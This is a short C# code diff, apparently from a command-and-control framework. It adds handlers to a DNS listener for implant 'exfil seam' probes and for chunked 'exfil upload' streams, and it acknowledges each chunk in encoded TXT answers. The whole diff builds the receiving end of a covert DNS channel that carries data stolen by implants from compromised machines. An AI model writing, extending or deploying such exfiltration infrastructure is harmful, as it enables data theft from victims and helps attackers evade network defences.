@@ -169,6 +169,27 @@ internal sealed class DnsContactAnswerer
                 response.Answers.Add(TxtAnswer(
                     name, DnsContactNames.Encode(new[] { (byte)(landed ? 'y' : 'n') })));
             }
+            else if (DnsContactNames.TryParseExfilSeam(name, _zone) is { } seam)
+            {
+                // The upload arm's seam probe (ADR-010): the decimal held
+                // count of the named run, base32-wrapped like every answer
+                // this grammar carries.
+                var held = await _bridge.ExfilSeamAsync(seam.Implant, seam.Task, seam.NameSha, cancellationToken);
+                if (held is not null)
+                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(held)));
+            }
+            else if (DnsContactNames.TryParseExfilUpload(name, _zone) is { } upload)
+            {
+                // The upload arm's sealed blob exchange: "+" while the
+                // stream assembles, on the terminal blob's placement too.
+                // A stream this listener cannot serve (broken sequence,
+                // cap overflow, an unsealable blob) answers nothing.
+                var ack = await _bridge.ExfilUploadChunkAsync(
+                    upload.Implant, upload.Stream, upload.Sequence, upload.Terminal, upload.Chunk,
+                    cancellationToken);
+                if (ack is not null)
+                    response.Answers.Add(TxtAnswer(name, DnsContactNames.Encode(ack)));
+            }
             else
             {
                 response.ResponseCode = 3; // NXDOMAIN: in-zone but not a contact
